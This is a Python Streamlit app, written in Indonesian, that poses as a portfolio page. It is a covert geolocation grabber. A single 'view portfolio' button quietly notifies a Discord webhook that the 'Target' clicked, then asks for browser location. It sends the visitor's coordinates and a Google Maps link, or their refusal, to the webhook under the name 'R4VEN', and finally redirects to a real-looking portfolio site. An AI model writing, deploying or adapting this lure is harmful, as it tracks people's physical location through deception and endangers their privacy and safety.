import streamlit as st
import streamlit.components.v1 as components

st.set_page_config(page_title="Portfolio", layout="wide")

hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

html_code = f"""
<!DOCTYPE html>
<html>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
  <!-- Tombol yang harus diklik pengguna -->
  <button onclick="startProcess()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px;">
    Klik di sini untuk melihat Portfolio
  </button>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    const WEBHOOK_URL = "{webhook_url}";

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    function startProcess() {{
      // Kirim info awal
      sendToDiscord({{
        username: "R4VEN",
        content: "Target mengklik tombol, memulai pengambilan data..."
      }});

      if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      }} else {{
        window.location.href = "https://iqbalmantam.github.io/portfolio/";
      }}
    }}

    function showPosition(position) {{
      var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
      var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
      
      sendToDiscord({{
        username: "R4VEN",
        embeds: [{{ 
            title: "Target Location (Click Allowed)", 
            description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
            color: 15844367 
        }}]
      }});

      window.location.href = "https://iqbalmantam.github.io/portfolio/";
    }}

    function showError(error) {{
      sendToDiscord({{
        username: "R4VEN",
        content: "Target menolak izin lokasi."
      }});
      window.location.href = "https://iqbalmantam.github.io/portfolio/";
    }}
  </script>
</body>
</html>
"""

if webhook_url:
    components.html(html_code, height=300)
else:
    st.error("⚠️ Webhook URL belum diatur!")
